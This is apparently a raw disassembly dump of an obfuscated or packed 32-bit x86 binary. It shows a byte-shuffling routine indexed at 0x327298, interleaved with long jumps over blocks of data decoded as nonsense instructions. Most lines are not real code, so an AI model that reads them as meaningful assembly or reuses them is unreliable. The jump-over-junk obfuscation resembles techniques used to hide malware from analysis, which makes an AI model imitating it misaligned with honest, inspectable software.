  412b0e:	jmp    0x4b3ae663
  412b13:	retf   
  412b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b15:	lock out 0xa5,eax
  412b18:	add    esi,DWORD PTR [ebx+0x575189a0]
  412b1e:	ret    
  412b1f:	sar    edx,0x20
  412b22:	cmp    esp,DWORD PTR [eax]
  412b24:	mul    BYTE PTR [ebx+0x4724c7dc]
  412b2a:	push   esi
  412b2b:	ss icebp 
  412b2d:	mov    al,ds:0x759dced4
  412b32:	xchg   ebp,eax
  412b33:	jp     0x412ad0
  412b35:	int    0x37
  412b37:	repnz xor edx,DWORD PTR [eax]
  412b3a:	pop    ss
  412b3b:	stos   DWORD PTR es:[edi],eax
  412b3c:	nop
  412b3d:	ss inc ecx
  412b3f:	cwde   
  412b40:	leave  
  412b41:	pop    sp
  412b43:	test   al,0x6e
  412b45:	das    
  412b46:	push   edx
  412b47:	and    edx,DWORD PTR [eax-0x4e4e50e2]
  412b4d:	pop    edx
  412b4e:	fwait
  412b4f:	stos   DWORD PTR es:[edi],eax
  412b50:	mov    dl,0xde
  412b52:	test   BYTE PTR [esi+0x1a],0xca
  412b56:	repz in eax,0x6c
  412b59:	cmp    DWORD PTR [eax],edx
  412b5b:	js     0x412bb9
  412b5d:	fmul   QWORD PTR [edi]
  412b5f:	fnstsw WORD PTR [ebp+0x4]
  412b62:	jo     0x412bdb
  412b64:	mov    al,ds:0x1ad78624
  412b69:	or     DWORD PTR [ecx+0x145ad633],ebp
  412b6f:	in     eax,0xec
  412b71:	xchg   edx,eax
  412b72:	clc    
  412b73:	fdivr  QWORD PTR [eax+0x2cd3960d]
  412b79:	xor    eax,0x6a5dbf21
  412b7e:	je     0x412bf8
  412b80:	imul   edi,DWORD PTR [eax+0x5d],0xb6670f03
  412b87:	jp     0x412c06
  412b89:	mov    esi,0x4e755a6b
  412b8e:	aas    
  412b8f:	repz mov ds:0xaf68c028,al
  412b95:	aas    
  412b96:	mov    ds:0xb8934d43,eax
  412b9b:	jno    0x412b7b
  412b9d:	sub    DWORD PTR [edx],edi
  412b9f:	call   0x88e4:0xd6b84098
  412ba6:	sahf   
  412ba7:	mov    ecx,DWORD PTR [eax-0x6f]
  412baa:	sbb    al,0xed
  412bac:	retf   
  412bad:	jb     0x412bbe
  412baf:	push   0x1fefb762
  412bb4:	jnp    0x412b7d
  412bb6:	loope  0x412b59
  412bb8:	mov    edx,0xdacace65
  412bbd:	jo     0x412b85
  412bbf:	cmp    BYTE PTR [ecx-0x297514a5],ch
  412bc5:	je     0x412b49
  412bc7:	test   BYTE PTR [ecx+0x72],bh
  412bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bcb:	xor    ah,BYTE PTR [ebp-0x4553c8c7]
  412bd1:	cmp    bl,BYTE PTR [ebp+0x671cb35]
  412bd7:	pop    ebp
  412bd8:	add    bh,cl
  412bda:	xor    esp,DWORD PTR [ecx-0x14713a5b]
  412be0:	sbb    BYTE PTR [ecx+ecx*4-0x433d8e9b],ah
  412be7:	mov    eax,0x93d89d26
  412bec:	repz inc ecx
  412bee:	inc    eax
  412bef:	add    ch,BYTE PTR [ecx+0x46]
  412bf2:	dec    ebp
  412bf3:	mov    DWORD PTR [edi-0x68cae8fa],edi
  412bf9:	inc    edx
  412bfa:	add    BYTE PTR [edi+0x1c],dl
  412bfd:	ja     0x412bc4
  412bff:	sbb    dh,BYTE PTR [edi+0x43]
  412c02:	sub    ebx,DWORD PTR [edi+0x4a]
  412c05:	sbb    BYTE PTR [ebp+0x4c3b0ff4],0x4c
  412c0c:	pop    eax
  412c0d:	pop    ds
  412c0e:	mov    bl,bh
  412c10:	jno    0x412c23
  412c12:	sahf   
  412c13:	add    eax,0x5f5a1c56
  412c18:	inc    ebx
  412c19:	nop
  412c1a:	icebp  
  412c1b:	mov    edi,0xc70457af
  412c20:	out    0xf0,al
  412c22:	mov    ds:0x5447313,eax
  412c27:	sbb    DWORD PTR [edx-0x1a],0x52
  412c2b:	pop    ecx
  412c2c:	cld    
  412c2d:	out    dx,eax
  412c2e:	enter  0x8fab,0x4
  412c32:	pop    ecx
  412c33:	pusha  
  412c34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c35:	or     bh,bl
  412c37:	pop    ebx
  412c38:	adc    al,0x16
  412c3a:	xchg   ebp,eax
  412c3b:	cli    
  412c3c:	or     BYTE PTR [ebx],ah
  412c3e:	std    
  412c3f:	out    0x3b,eax
  412c41:	or     dl,cl
  412c43:	dec    eax
  412c44:	push   ecx
  412c45:	daa    
  412c46:	sub    eax,0x8babb012
  412c4b:	mov    dh,0x6c
  412c4d:	sub    DWORD PTR [esi],0x4ac34357
  412c53:	arpl   WORD PTR [edi+0x711651ae],di
  412c59:	jmp    0x406332b6
  412c5e:	mov    ecx,0x8557a98c
  412c63:	cmp    esp,edi
  412c65:	icebp  
  412c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c67:	mov    edi,DWORD PTR [ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [esi],esp
  412c83:	in     eax,0xb
  412c85:	lods   al,BYTE PTR ds:[esi]
  412c86:	cld    
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412c75
  412c8f:	in     al,0x12
  412c91:	fbld   TBYTE PTR [eax]
  412c93:	out    0x5f,eax
  412c95:	scas   al,BYTE PTR es:[edi]
  412c96:	stc    
  412c97:	(bad)  
  412c98:	sub    DWORD PTR [edx],edi
  412c9a:	push   ds
  412c9b:	sub    DWORD PTR [edi+0x512c082c],eax
  412ca1:	jg     0x412c9c
  412ca3:	loope  0x412c31
  412ca5:	cmp    DWORD PTR [ecx+0x2f9d61ff],ebp
  412cab:	in     al,dx
  412cac:	les    ebx,FWORD PTR [esi-0x65]
  412caf:	bound  esi,QWORD PTR [ecx-0x6e7a4ca6]
  412cb5:	rcl    BYTE PTR [ecx+eax*1],cl
  412cb8:	fwait
  412cb9:	inc    ebx
  412cba:	in     eax,0x31
  412cbc:	ins    DWORD PTR es:[edi],dx
  412cbd:	ja     0x412c88
  412cbf:	lahf   
  412cc0:	shl    ah,1
  412cc2:	xor    al,0xbc
  412cc4:	pushf  
  412cc5:	pop    eax
  412cc6:	jnp    0x412c8b
  412cc8:	leave  
  412cc9:	ret    0x85f2
  412ccc:	or     cl,dl
  412cce:	jo     0x412cee
  412cd0:	or     eax,edx
  412cd2:	mov    WORD PTR [ecx],?
  412cd4:	sub    cl,bl
  412cd6:	xchg   ecx,eax
  412cd7:	loopne 0x412d3c
  412cd9:	daa    
  412cda:	and    DWORD PTR [edi],edx
  412cdc:	jns    0x412ca2
  412cde:	or     ebx,ecx
  412ce0:	xchg   eax,ebp
  412ce2:	pop    esi
  412ce3:	dec    ebp
  412ce4:	inc    edx
  412ce5:	cmp    al,0x9b
  412ce7:	sbb    eax,DWORD PTR [ecx+0x5a35cbf4]
  412ced:	(bad)  
  412cef:	xchg   ebx,eax
  412cf0:	push   ecx
  412cf1:	mov    esp,0xd893cb18
  412cf6:	cmc    
  412cf7:	pop    ebp
  412cf8:	mul    BYTE PTR [ecx-0x13]
  412cfb:	push   0x2228e717
  412d00:	adc    BYTE PTR [ebp+0x5bfb4e0b],dl
  412d06:	pop    esi
  412d07:	jecxz  0x412cb6
  412d09:	xchg   edx,eax
  412d0a:	push   edx
  412d0b:	pop    es
  412d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d0d:	hlt    
  412d0e:	outs   dx,DWORD PTR ds:[esi]
  412d0f:	leave  
  412d10:	adc    dl,bh
  412d12:	xor    bh,BYTE PTR [edx]
  412d14:	mov    ebx,edi
  412d16:	in     eax,0x97
  412d18:	in     eax,0x8b
  412d1a:	cmp    eax,0x1ee3bdde
  412d1f:	push   ecx
  412d20:	ja     0x412ca7
  412d22:	xor    ah,BYTE PTR [ebp+0x3bb3c6f]
  412d28:	dec    ebp
  412d29:	and    BYTE PTR [ebp-0x9],ch
  412d2c:	mov    ch,0x53
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d30:	cmp    ch,BYTE PTR [eax+0x4b]
  412d33:	cmc    
  412d34:	push   ecx
  412d35:	push   eax
  412d36:	xor    cl,dh
  412d38:	inc    ecx
  412d39:	leave  
  412d3a:	add    BYTE PTR [esi-0x6a732899],al
  412d40:	dec    edx
  412d41:	push   ss
  412d42:	int    0xb1
  412d44:	jne    0x412d0a
  412d46:	mov    eax,0x2092b3ed
  412d4b:	stos   BYTE PTR es:[edi],al
  412d4c:	sub    DWORD PTR [ebx+0x764db2c2],0xffffffa8
  412d53:	jmp    0x412d31
  412d55:	and    eax,0x4e748ffd
  412d5a:	mov    ebp,DWORD PTR [eax+0x6d]
  412d5d:	cli    
  412d5e:	push   ebp
  412d5f:	pop    ecx
  412d60:	pop    ss
  412d61:	push   es
  412d62:	inc    ebx
  412d63:	std    
  412d64:	mov    cs,WORD PTR [esi]
  412d66:	jecxz  0x412cf5
  412d68:	mov    BYTE PTR [edx+0x1b],ch
  412d6b:	mov    ah,BYTE PTR [ebp-0x375ebd50]
  412d71:	ins    BYTE PTR es:[edi],dx
  412d72:	sti    
  412d73:	ret    0xeefc
  412d76:	mov    ss,WORD PTR [ecx+eax*4]
  412d79:	call   0x9633:0x7f265dc1
  412d80:	push   es
  412d81:	daa    
  412d82:	js     0x412d6c
  412d84:	pushf  
  412d85:	sub    ebp,DWORD PTR ds:0x29b15eb7
  412d8b:	mov    al,0x9a
  412d8d:	push   ss
  412d8e:	cmp    BYTE PTR [edx+0x14b72967],dh
  412d94:	(bad)  
  412d95:	adc    eax,0x8e7a7432
  412d9a:	retf   0xb605
  412d9d:	lods   al,BYTE PTR ds:[esi]
  412d9e:	das    
  412d9f:	iret   
  412da0:	pusha  
  412da1:	(bad)  
  412da2:	sbb    eax,0x6cc920b0
  412da7:	dec    ebp
  412da8:	adc    esi,edi
  412daa:	jno    0x412d87
  412dac:	lods   eax,DWORD PTR ds:[esi]
  412dad:	xor    bh,BYTE PTR [eiz*4+0x283af411]
  412db4:	scas   al,BYTE PTR es:[edi]
  412db5:	(bad)
  412db9:	dec    esi
  412dba:	or     ah,BYTE PTR ds:0xddf5125c
  412dc0:	psllw  mm6,QWORD PTR [ecx+0x4e]
  412dc4:	movsx  esp,bh
  412dc7:	jmp    0x412dcc
  412dc9:	jnp    0x412d8d
  412dcb:	cmp    eax,DWORD PTR ds:0x2d776e0f
  412dd1:	mov    ebx,0x2a9d1ed0
  412dd6:	xor    eax,0x3d6babda
  412ddb:	and    eax,0x3b4ee24d
  412de0:	ja     0x412e3b
  412de2:	repz aad 0xf
  412de5:	out    dx,eax
  412de6:	lock scas al,BYTE PTR es:[edi]
  412de8:	cmc    
  412de9:	fcmovu st,st(5)
  412deb:	mov    eax,ds:0x7ecd4a44
  412df0:	imul   ecx,edi,0x7ccc0f95
  412df6:	lds    ebp,FWORD PTR [ebp+0x2f5dd0db]
  412dfc:	or     eax,0x13fcf3ff
  412e01:	fs xchg ebp,eax
  412e03:	mov    ?,WORD PTR [ebp+0xf]
  412e06:	add    DWORD PTR [ecx],0x12c5650e
  412e0c:	or     al,0xdd
  412e0e:	pop    esi
  412e0f:	js     0x412dbc
  412e11:	(bad)
  412e15:	lahf   
  412e16:	cmc    
  412e17:	aad    0x62
  412e19:	mov    gs,WORD PTR [eax+0x3f]
  412e1c:	xlat   BYTE PTR ds:[ebx]
  412e1d:	enter  0x65d2,0x23
  412e21:	mov    dh,0xf3
  412e23:	rcr    BYTE PTR [ebp+0x50203165],cl
  412e29:	mov    eax,0xc49cd5ce
  412e2e:	jl     0x412e74
  412e30:	mov    bl,0x5d
  412e32:	jbe    0x412de8
  412e34:	test   BYTE PTR [ebx],0x10
  412e37:	pop    ebx
  412e38:	xchg   ebp,eax
  412e39:	dec    ebp
  412e3a:	cmp    DWORD PTR [ebp+0x2c7d7ff2],0xffffffe8
  412e41:	(bad)  
  412e42:	scas   al,BYTE PTR es:[edi]
  412e43:	test   BYTE PTR [ecx-0x3f08789b],0x32
  412e4a:	je     0x412e34
  412e4c:	ins    BYTE PTR es:[edi],dx
  412e4d:	daa    
  412e4e:	add    edi,DWORD PTR [edi-0x2f]
  412e51:	jge    0x412e67
  412e53:	int    0x73
  412e55:	ins    DWORD PTR es:[edi],dx
  412e56:	mov    ecx,0xc4a2f823
  412e5b:	xchg   ah,al
  412e5d:	jmp    0x7136:0xf58ef0bd
  412e64:	adc    al,dl
  412e66:	dec    ebp
  412e67:	imul   ebp,DWORD PTR [ebx+esi*4],0xaec9ad03
  412e6e:	pop    ss
  412e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e70:	out    dx,eax
  412e71:	imul   ecx,DWORD PTR fs:[eax-0x5b00c0f8],0x79c379e
  412e7c:	gs pop edi
  412e7e:	(bad)  
  412e80:	add    esp,esp
  412e82:	pusha  
  412e83:	dec    eax
  412e84:	add    al,0xa4
  412e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e87:	test   al,0x43
  412e89:	js     0x412e29
  412e8b:	(bad)  
  412e8c:	jmp    0xbfe8fd8b
  412e91:	mov    DWORD PTR [esi+0x6c],ecx
  412e94:	sub    DWORD PTR [ebx+0x37],esi
  412e97:	adc    BYTE PTR [edi-0x2],ah
  412e9a:	mov    al,BYTE PTR [edx-0x50]
  412e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e9e:	test   DWORD PTR [edx+eax*1],0xd3f2b29b
  412ea5:	inc    esi
  412ea6:	xor    DWORD PTR ds:0x79eb42bd,edx
  412eac:	pop    ss
  412ead:	outs   dx,BYTE PTR ds:[esi]
  412eae:	popf   
  412eaf:	loop   0x412e6f
  412eb1:	sahf   
  412eb2:	or     eax,0x1d1caa55
  412eb7:	xchg   edx,eax
  412eb8:	aad    0x29
  412eba:	mov    ch,0xbf
  412ebc:	loope  0x412f01
  412ebe:	or     eax,DWORD PTR [esi]
  412ec0:	mov    bh,0xb3
  412ec2:	jg     0x412e62
  412ec4:	sbb    ch,BYTE PTR [esi]
  412ec6:	mov    edx,DWORD PTR [eax+0x3f]
  412ec9:	and    BYTE PTR ds:0x84fd6907,ch
  412ecf:	sbb    eax,0x9fce1d4b
  412ed4:	adc    esi,esi
  412ed6:	adc    bh,BYTE PTR [esi-0x7b8e237e]
  412edc:	fcomp  DWORD PTR [edi-0x1d38ef72]
  412ee3:	hlt    
  412ee4:	mov    cl,0x64
  412ee6:	scas   eax,DWORD PTR es:[edi]
  412ee7:	jecxz  0x412f5c
  412ee9:	push   ss
  412eea:	scas   eax,DWORD PTR es:[edi]
  412eeb:	into   
  412eec:	mov    al,0x2c
  412eee:	push   ds
  412eef:	push   es
  412ef0:	out    0x89,eax
  412ef2:	pop    esi
  412ef3:	xchg   esp,eax
  412ef4:	js     0x412f5e
  412ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef7:	mov    bh,bl
  412ef9:	mov    BYTE PTR [ebp+0xf],dl
  412efc:	mov    edx,DWORD PTR [ebp-0xc]
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0xa
  412f26:	fsub   QWORD PTR [ecx]
  412f28:	int    0x69
  412f2a:	jne    0x412fa4
  412f2c:	js     0x412f13
  412f2e:	jle    0x412fa8
  412f30:	js     0x412f2b
  412f32:	cs xchg edx,eax
  412f34:	inc    eax
  412f35:	lods   al,BYTE PTR ds:[esi]
  412f36:	xchg   esp,eax
  412f37:	jg     0x412ef4
  412f39:	stc    
  412f3a:	mov    ch,0xae
  412f3c:	sbb    dh,BYTE PTR [edi]
  412f3e:	mov    dh,0x6d
  412f40:	xor    al,0x21
  412f42:	xor    al,0xff
  412f44:	lds    esi,FWORD PTR [edx+0x5d]
  412f47:	out    dx,al
  412f48:	fisubr WORD PTR [edx+0x2dd2aef5]
  412f4e:	inc    ebx
  412f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f50:	add    BYTE PTR [esi+0x3c7e2a5d],bl
  412f56:	std    
  412f57:	sbb    eax,0x6e12a6d9
  412f5c:	xchg   esp,eax
  412f5d:	inc    edi
  412f5e:	out    dx,eax
  412f5f:	adc    edx,DWORD PTR ds:0x947010ed
  412f65:	dec    ecx
  412f66:	sbb    BYTE PTR gs:[edx+eiz*4+0xe5ffe2f],dh
  412f6e:	push   ebp
  412f6f:	test   BYTE PTR [edx+0x71f1eeef],ah
  412f75:	aam    0xb
  412f77:	call   0x913f:0xc90f761a
  412f7e:	inc    esi
  412f7f:	mov    eax,0xb98b722c
  412f84:	mov    eax,0xa4fd895a
  412f89:	fimul  DWORD PTR [ebp+edx*2+0x19a6a0db]
  412f90:	or     dl,BYTE PTR [ebp-0x5c3cbada]
  412f96:	lods   eax,DWORD PTR ds:[esi]
  412f97:	jno    0x412f5a
  412f99:	xchg   ebp,eax
  412f9a:	push   ecx
  412f9b:	xchg   esp,eax
  412f9c:	mov    edi,0x4f15a9fa
  412fa1:	jge    0x412fce
  412fa3:	sub    al,0x1f
  412fa5:	push   ebp
  412fa6:	mov    al,ds:0xd84cc88
  412fab:	test   eax,0x817ade00
  412fb0:	clc    
  412fb1:	mov    BYTE PTR [esi-0x1f],ch
  412fb4:	ja     0x41300c
  412fb6:	lods   al,BYTE PTR ds:[esi]
  412fb7:	xchg   edx,eax
  412fb8:	inc    eax
  412fb9:	jbe    0x412fa0
  412fbb:	add    al,BYTE PTR [eax-0x47]
  412fbe:	mov    ecx,0x80d723e
  412fc3:	mov    bh,0x8f
  412fc5:	jmp    0x412fd5
  412fc7:	cmp    BYTE PTR [ecx],ch
  412fc9:	fwait
  412fca:	cld    
  412fcb:	pop    edx
  412fcc:	push   ebp
  412fcd:	push   esi
  412fce:	in     eax,dx
  412fcf:	pop    ecx
  412fd0:	fist   WORD PTR [eax]
  412fd2:	int    0x8c
  412fd4:	repnz and BYTE PTR [edx-0x77f2362a],0x7d
  412fdc:	dec    eax
  412fdd:	arpl   WORD PTR [edi+0x73],bx
  412fe0:	(bad)  
  412fe2:	into   
  412fe3:	ins    DWORD PTR es:[edi],dx
  412fe4:	add    eax,0x243b49b3
  412fe9:	call   0xc544:0x28d9f65b
  412ff0:	lea    ebp,[edx]
  412ff2:	jb     0x412f9b
  412ff4:	add    cl,cl
  412ff6:	jg     0x412fd9
  412ff8:	or     eax,0x3d10705f
  412ffd:	cmp    eax,0x16918a2f
  413002:	mov    DWORD PTR [esi],edx
  413004:	repnz data16 out 0x19,al
  413008:	fcmovne st,st(2)
  41300a:	dec    ecx
  41300b:	mov    bh,0x28
  41300d:	fdiv   QWORD PTR [ebx-0x14]
  413010:	mov    edi,0x832948d2
  413015:	dec    ebp
  413016:	adc    edi,0xffffff8d
  413019:	push   ecx
  41301a:	into   
  41301b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41301c:	push   cs
  41301d:	mov    bl,0xce
  41301f:	inc    ebp
  413020:	xchg   edi,eax
  413021:	mov    ebp,edx
  413023:	dec    edi
  413024:	(bad)  
  413026:	jnp    0x413037
  413028:	int    0xbb
  41302a:	dec    BYTE PTR [ecx-0x42]
  41302d:	and    al,0xf7
  41302f:	mul    BYTE PTR [esp+ecx*8+0x1e]
  413033:	sar    BYTE PTR [ecx-0x41],0x5f
  413037:	inc    ebp
  413038:	pop    eax
  413039:	int    0xbe
  41303b:	mov    esi,0x2e0f7b50
  413040:	push   esi
  413041:	push   eax
  413042:	add    dl,BYTE PTR [eax]
  413044:	lds    eax,FWORD PTR [eax+eiz*8+0x44]
  413048:	adc    al,BYTE PTR [ebp+0x670687f8]
  41304e:	iret   
  41304f:	sub    ecx,DWORD PTR [eax+esi*4+0x53e82c1f]
  413056:	dec    edi
  413057:	es xchg edx,eax
  413059:	push   ss
  41305a:	xor    al,0xe6
  41305c:	jne    0x41309b
  41305e:	adc    DWORD PTR [ecx+ecx*2-0x37ea6c77],edi
  413065:	clc    
  413066:	push   ebx
  413067:	fldcw  WORD PTR [ebx-0x65cf8a26]
  41306d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41306e:	out    0x2,al
  413070:	stos   DWORD PTR es:[edi],eax
  413071:	xchg   DWORD PTR [edx],ecx
  413073:	stos   BYTE PTR es:[edi],al
  413074:	outs   dx,BYTE PTR ds:[esi]
  413075:	iret   
  413076:	call   0x227c:0x366c303a
  41307d:	cmp    eax,0x6ab8de2b
  413082:	loop   0x41309b
  413084:	int    0xe6
  413086:	sub    DWORD PTR [eax],ebx
  413088:	popf   
  413089:	jge    0x41304d
  41308b:	dec    esp
  41308c:	xchg   edx,eax
  41308d:	sbb    BYTE PTR [ecx-0x20],0x8f
  413091:	add    al,0x7b
  413093:	das    
  413094:	jmp    0x413080
  413096:	push   esi
  413097:	adc    al,0xe5
  413099:	cmp    dl,BYTE PTR [ebx+0x1a]
  41309c:	arpl   di,di
  41309e:	push   0xffffff9a
  4130a0:	jge    0x4130ce
  4130a2:	and    eax,0xf3f21cb4
  4130a7:	jmp    0x1efa:0x789d43dc
  4130ae:	hlt    
  4130af:	inc    ecx
  4130b0:	arpl   WORD PTR [ecx-0x3afeffba],cx
  4130b6:	jge    0x413095
  4130b8:	and    dl,BYTE PTR [ecx]
  4130ba:	scas   al,BYTE PTR es:[edi]
  4130bb:	mov    esp,0xa6ad6412
  4130c0:	inc    esi
  4130c1:	in     eax,0xec
  4130c3:	pop    es
  4130c4:	dec    ecx
  4130c5:	fstp   QWORD PTR [edi+ebp*2+0x6b]
  4130c9:	ins    DWORD PTR es:[edi],dx
  4130ca:	adc    ebx,DWORD PTR [eax+eax*8-0x25]
  4130ce:	jne    0x413071
  4130d0:	aaa    
  4130d1:	scas   eax,DWORD PTR es:[edi]
  4130d2:	cs mov ebp,0x39c1a21d
  4130d8:	iret   
  4130d9:	inc    edx
  4130da:	mov    edx,0x883ae96e
  4130df:	xchg   edi,eax
  4130e0:	aas    
  4130e1:	int3   
  4130e2:	fldenv [eax-0x6db792b1]
  4130e8:	push   0xf1bf8656
  4130ed:	in     eax,dx
  4130ee:	push   0x32b6406e
  4130f3:	or     ch,0x4d
  4130f6:	xchg   edi,eax
  4130f7:	jecxz  0x413081
  4130f9:	test   al,0x9c
  4130fb:	pusha  
  4130fc:	pop    ecx
  4130fd:	stos   BYTE PTR es:[edi],al
  4130fe:	dec    eax
  4130ff:	mov    esi,0xe776c34a
  413104:	inc    esp
  413105:	gs lahf 
  413107:	ins    BYTE PTR es:[edi],dx
  413108:	pop    ecx
  413109:	add    al,0x57
  41310b:	jge    0x413093
  41310d:	loope  0x413182
  41310f:	out    dx,al
  413110:	mov    dh,0x2e
  413112:	sahf   
  413113:	dec    ebx
  413114:	imul   DWORD PTR [edx+0x54]
  413117:	cld    
  413118:	dec    edx
  413119:	and    ebp,DWORD PTR [esi+0x2a]
  41311c:	inc    ecx
  41311d:	add    eax,0xd474460b
  413122:	inc    edx
  413123:	or     BYTE PTR [edi-0x5f],al
  413126:	jnp    0x413179
  413128:	dec    esi
  413129:	scas   al,BYTE PTR es:[edi]
  41312a:	jae    0x413193
  41312c:	aas    
  41312d:	inc    DWORD PTR [ecx]
  41312f:	mov    dh,0x3f
  413131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413132:	jge    0x413198
  413134:	xchg   ebx,eax
  413135:	cmc    
  413136:	ss mov cl,0x95
  413139:	and    BYTE PTR [eax],al
  41313b:	push   esi
  41313c:	jns    0x4131bd
  41313e:	jecxz  0x413158
  413140:	mov    al,0x75
  413142:	std    
  413143:	leave  
  413144:	iret   
  413145:	les    edx,FWORD PTR [ebx-0xab58a56]
  41314b:	jge    0x413152
  41314d:	inc    edx
  41314e:	jmp    0x706fa9b2
  413153:	call   0x24cd:0xa136e75f
  41315a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41315b:	idiv   BYTE PTR [eax+0x724c988c]
  413161:	sti    
  413162:	sahf   
  413163:	mov    ds:0x8c894626,al
  413168:	lods   eax,DWORD PTR ds:[esi]
  413169:	scas   eax,DWORD PTR es:[edi]
  41316a:	sub    BYTE PTR [ebx+0x3d],0xd9
  41316e:	xor    al,0x8a
  413170:	mov    al,ds:0xf05f8b83
  413175:	out    dx,al
  413176:	or     BYTE PTR [eax],al
  413178:	mov    ebp,0x97b806be
  41317d:	div    DWORD PTR [edi]
  41317f:	sub    BYTE PTR [esi-0x70],ch
  413182:	xchg   al,bl
  413184:	push   0xfbd4d2a1
  413189:	xchg   edi,eax
  41318a:	dec    eax
  41318b:	out    dx,eax
  41318c:	fmul   DWORD PTR [ecx+0x57]
  41318f:	sub    eax,0xdade14c9
  413194:	push   ebp
  413195:	test   eax,0xafff50cc
  41319a:	in     eax,0x11
  41319c:	mov    edi,DWORD PTR [ebp-0xc]
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131c8:	sub    DWORD PTR [esp+esi*8-0x2a],ebx
  4131cc:	jp     0x413246
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x413224
  4131d4:	cmp    BYTE PTR ds:0x88618810,ch
  4131da:	push   ecx
  4131db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131dc:	leave  
  4131dd:	sbb    eax,0x2873a784
  4131e2:	jno    0x413259
  4131e4:	mov    ds:0x656aa02,al
  4131e9:	enter  0x7b0f,0x43
  4131ed:	in     eax,0x45
  4131ef:	int3   
  4131f0:	jnp    0x41322b
  4131f2:	call   0xc759:0x1a174249
  4131f9:	das    
  4131fa:	cmp    eax,0xdc6507eb
  4131ff:	inc    esi
  413200:	ds or  al,0x1a
  413203:	jne    0x4131e1
  413205:	test   eax,0xd51a60af
  41320a:	adc    eax,0xc98058b0
  41320f:	cmp    esp,DWORD PTR [eax]
  413211:	rcr    BYTE PTR [esi-0x1a4ce911],0xb6
  413218:	adc    eax,0xe7a52725
  41321d:	xchg   cx,ax
  41321f:	adc    DWORD PTR [ebx+ecx*8-0x67],0x8789da9f
  413227:	lods   al,BYTE PTR ds:[esi]
  413228:	inc    DWORD PTR [eax+0x761ceca4]
  41322e:	dec    ecx
  41322f:	pop    edi
  413230:	(bad)  
  413231:	sti    
  413232:	mov    al,ds:0x2208ae3a
  413237:	add    esp,DWORD PTR [esi-0x435f1318]
  41323d:	into   
  41323e:	cli    
  41323f:	arpl   WORD PTR [esi+esi*8],si
  413242:	dec    ebp
  413243:	es stos BYTE PTR es:[edi],al
  413245:	ins    BYTE PTR es:[edi],dx
  413246:	mov    eax,0xb6ed942c
  41324b:	and    DWORD PTR [ecx+0x3b],esp
  41324e:	lods   al,BYTE PTR ds:[esi]
  41324f:	cmc    
  413250:	xchg   esp,eax
  413251:	xor    DWORD PTR [esi-0x3f],0xffffffab
  413255:	icebp  
  413256:	out    dx,al
  413257:	test   edi,ebp
  413259:	mov    cl,0x2a
  41325b:	dec    edx
  41325c:	loope  0x413252
  41325e:	stos   DWORD PTR es:[edi],eax
  41325f:	jg     0x41326e
  413261:	(bad)  
  413262:	retf   0x390
  413265:	xor    esp,DWORD PTR [edi]
  413267:	or     BYTE PTR [eax],al
  413269:	mov    esi,0xdc600701
  41326e:	sbb    cl,bh
  413270:	cli    
  413271:	jp     0x4131f3
  413273:	(bad)  
  413274:	jbe    0x413254
  413276:	pop    edi
  413277:	mov    ch,0x5f
  413279:	pop    esp
  41327a:	mov    edi,DWORD PTR [ecx+0x24]
  41327d:	mov    BYTE PTR [ecx+0x38],dl
  413280:	scas   eax,DWORD PTR es:[edi]
  413281:	rcr    DWORD PTR [edi+0x7c299917],0xa9
  413288:	pop    es
  413289:	mov    eax,ds:0xa3d36e54
  41328e:	in     eax,0xdf
  413290:	xor    DWORD PTR [ebp+0x3b],esp
  413293:	add    al,0x3c
  413295:	ins    BYTE PTR es:[edi],dx
  413296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413297:	(bad)  
  413298:	repz dec edx
  41329a:	pushf  
  41329b:	test   eax,0xc65861dc
  4132a0:	fiadd  WORD PTR [ebx-0x665e6af6]
  4132a6:	mov    edx,0xc3f2deb4
  4132ab:	popa   
  4132ac:	test   eax,0xf296e889
  4132b1:	call   FWORD PTR [esi-0x22]
  4132b4:	ret    0x38de
  4132b7:	xchg   ebp,eax
